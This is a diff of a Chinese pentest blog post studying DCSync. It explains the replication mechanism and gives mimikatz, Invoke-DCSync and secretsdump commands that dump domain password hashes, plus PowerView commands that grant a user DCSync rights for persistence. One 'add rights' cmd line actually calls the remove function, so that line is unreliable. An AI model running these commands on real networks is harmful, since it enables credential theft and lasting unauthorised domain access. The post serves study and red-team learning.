@@ -23,16 +23,16 @@
   <meta name="author" content="dr0n">
   <meta name="keywords" content="ctf, writeups, web, misc">
   
-    <meta name="description" content="DumpingDCSyncDcsync(domain Controller synchronization)：在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 DRS(Directory Replication Service) 协议向主域控发起一个 IDL_DRSGetNCChanges 请求。请求的数据包括需要同步的">
+    <meta name="description" content="DumpingDCSyncDCSync(domain Controller synchronization)是指在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 DRS(Directory Replication Service) 协议向主域控发起一个 IDL_DRSGetNCChanges 请求，请求的数据包括需要同步">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透学习(Credentials篇)">
 <meta property="og:url" content="https://www.dr0n.top/posts/e0ff8995/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="DumpingDCSyncDcsync(domain Controller synchronization)：在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 DRS(Directory Replication Service) 协议向主域控发起一个 IDL_DRSGetNCChanges 请求。请求的数据包括需要同步的">
+<meta property="og:description" content="DumpingDCSyncDCSync(domain Controller synchronization)是指在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 DRS(Directory Replication Service) 协议向主域控发起一个 IDL_DRSGetNCChanges 请求，请求的数据包括需要同步">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Tsclient-12.png">
 <meta property="article:published_time" content="2025-04-28T04:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-04T15:47:06.753Z">
+<meta property="article:modified_time" content="2026-04-19T12:04:16.866Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="Credentials">
 <meta property="article:tag" content="内网渗透">
@@ -487,22 +487,22 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Dumping"><a href="#Dumping" class="headerlink" title="Dumping"></a>Dumping</h1><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>Dcsync(domain Controller synchronization)：在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 <strong>DRS(Directory Replication Service)</strong> 协议向主域控发起一个 IDL_DRSGetNCChanges 请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程</p>
-<p>目录复制服务(DRS) 远程协议是一种RPC 协议，用于在Active Directory中复制和管理数据<br>该协议由两个名为 drsuapi 和 dsaop 的 RPC 接口组成。每个 drsuapi 方法的名称以”IDL_DRS”开头，而每个 dsaop 方法的名称以”IDL_DSA”开头</p>
-<p>DCSync 就是利用的这个原理，通过 DRS(Directory Replication Service) 服务的 GetNCChanges 接口向域控发起数据同步请求</p>
+                <h1 id="Dumping"><a href="#Dumping" class="headerlink" title="Dumping"></a>Dumping</h1><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>DCSync(domain Controller synchronization)是指在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 <strong>DRS(Directory Replication Service)</strong> 协议向主域控发起一个 IDL_DRSGetNCChanges 请求，请求的数据包括需要同步的数据</p>
+<p>目录复制服务(DRS)远程协议是一种 RPC 协议，用于在 Active Directory 中复制和管理数据。该协议由两个名为 drsuapi 和 dsaop 的 RPC 接口组成，每个 drsuapi 方法的名称以 IDL_DRS 开头，而每个 dsaop 方法的名称以 IDL_DSA 开头</p>
+<p>DCSync 就是利用的这个原理，通过 DRS(Directory Replication Service) 服务的 GetNCChanges 接口向域控发起数据同步请求，以此来导出域内所有用户hash</p>
 <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>要进行DCSync则必须要能够运行DRS服务，通常以下用户组可以运行DRS服务</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DC本地Administrators组内的用户<br>Domain Admins组内的用户<br>Enterprise Admins组内的用户<br>域控制器的计算机帐户<br></code></pre></td></tr></table></figure>
 
-<p>需要的acl，以上组内的成员默认有这些权限</p>
+<p>需要的ACL：(以上组内的成员默认有这些权限)</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)<br>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)<br></code></pre></td></tr></table></figure>
 
-<p>默认情况下，DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的</p>
+<p>默认情况下，DCSync 攻击的对象如果是只读域控制器(RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的</p>
 <h3 id="导出域内hash"><a href="#导出域内hash" class="headerlink" title="导出域内hash"></a>导出域内hash</h3><p>mimikatz</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出域内所有用户的hash：</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:test.com /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br><br><br><span class="hljs-comment"># 导出域内administrator帐户的hash：</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:test.com /user:administrator /csv&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出域内所有用户的hash</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:test.com /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br><br><br><span class="hljs-comment"># 导出域内administrator帐户的hash</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:test.com /user:administrator /csv&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
 
 
 <p><a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">Invoke-DCSync.ps1</a></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1<br><span class="hljs-built_in">Invoke-DCSync</span><br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span>  <span class="hljs-comment"># 导出域内所有用户的hash：</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1<br><span class="hljs-built_in">Invoke-DCSync</span><br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span>  <span class="hljs-comment"># 导出域内所有用户的hash</span><br></code></pre></td></tr></table></figure>
 
 <p>secretsdump.py</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 secretsdump.py <span class="hljs-built_in">test</span>/admin:www123456#@192.168.189.128  -dc-ip  192.168.189.128<br>python3 secretsdump.py <span class="hljs-string">&#x27;test.com/admin@dc.test.com&#x27;</span> -hashes :6dfad00b946adf3479fba71beeb5e4ac<br></code></pre></td></tr></table></figure>
@@ -515,7 +515,7 @@
 <li>如果用 mimikatz 等工具，445 端口不是必须的，只要 RPC&#x2F;LDAP 相关端口开放即可。当445 端口被禁用时，DCSync 依然可以通过 RPC 端口（135+高位端口）实现，推荐使用 Mimikatz，只要 RPC 通信不被阻断，DCSync 就能成功</li>
 <li>有杀软的情况可以考虑使用impacket中的secretsdump</li>
 </ol>
-<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>向域内的一个普通用户添加上面提到的两条acl，该用户即可获得利用DCSync导出域内所有用户hash的权限</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>向域内的一个普通用户添加上面提到的两条ACL，该用户即可获得利用DCSync导出域内所有用户hash的权限</p>
 <p>实现代码：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270">Powerview Add-DomainObjectAcl</a></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span><br><span class="hljs-built_in">import-module</span> .\PowerView.ps1<br><br><br><br><span class="hljs-comment"># PowerView 查询DCSync权限</span><br><span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?&#123;<span class="hljs-variable">$_</span>.ObjectAceType  <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;DS-Replication-Get-Changes&quot;</span>&#125;<br><span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?&#123;<span class="hljs-variable">$_</span>.ObjectAceType  <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;Replicating Directory Changes&quot;</span>&#125;<br><br><br><br><span class="hljs-comment"># PowerView 添加DCSync权限</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=test,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> test1 <span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># cmd</span><br>powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;</span>DC=test,DC=com\<span class="hljs-string">&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose&#125;&quot;</span><br><br><br><br><span class="hljs-comment"># PowerView 删除DCSync权限</span><br><span class="hljs-built_in">Remove-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=test,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> test1 <span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># cmd</span><br>powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;</span>DC=test,DC=com\<span class="hljs-string">&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 
@@ -606,7 +606,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年11月4日</div>
+          <div>2026年4月19日</div>
         </div>
       
       
